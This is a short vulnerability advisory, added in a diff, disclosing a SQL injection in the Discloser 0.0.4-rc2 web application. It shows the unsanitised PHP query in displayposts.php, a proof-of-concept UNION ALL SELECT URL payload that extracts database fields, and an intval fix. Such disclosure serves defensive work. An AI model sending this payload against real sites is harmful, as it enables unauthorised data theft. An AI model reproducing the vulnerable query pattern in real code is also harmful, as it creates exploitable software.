@@ -1,0 +1,72 @@
+********   Salvatore "drosophila" Fresta   ********
+
+[+] Application: Discloser
+[+] Version: 0.0.4-rc2
+[+] Website: http://discloser.sourceforge.net/
+
+[+] Bugs: [A] SQL Injection
+
+[+] Exploitation: Remote
+[+] Date: 21 Feb 2004
+
+[+] Discovered by: Salvatore Fresta aka drosophila
+[+] Author: Salvatore Fresta aka drosophila
+[+] E-mail: drosophilaxxx [at] gmail.com
+
+
+***************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+***************************************************
+
+[+] Bugs
+
+
+- [A] SQL Injection
+
+[-] Risk: medium
+[-] File affected: displayposts.php
+
+This flaw allows a guest to insert arbitrary SQL 
+statments in the affected query.
+
+...
+
+if (isset($_GET['more'])) {
+			$more = $_GET['more'];
+			$query = mysql_query("select ". $tableprefix ."posts.*, ". $tableprefix ."users.username, ". $tableprefix ."users.email from ". $tableprefix ."posts, ". $tableprefix ."users where ". $tableprefix ."posts.poster = ". $tableprefix ."users.username and ". $tableprefix ."posts.id = $more");
+
+...
+
+
+***************************************************
+
+[+] Code
+
+
+- [A] SQL Injection
+
+You can retrieve information from 3,4,7,8 fields.
+
+http://www.site.com/path/index.php?more=-1 UNION ALL SELECT 1,'long',3,4,5,6,7,8,9,10
+
+
+***************************************************
+
+[+] Fix
+
+To fix the flaw, you must to accept numeric content
+only, using, for example, intval PHP function:
+
+$more = intval($_GET['more']);
+
+
+***************************************************
+
+# milw0rm.com [2009-08-03]
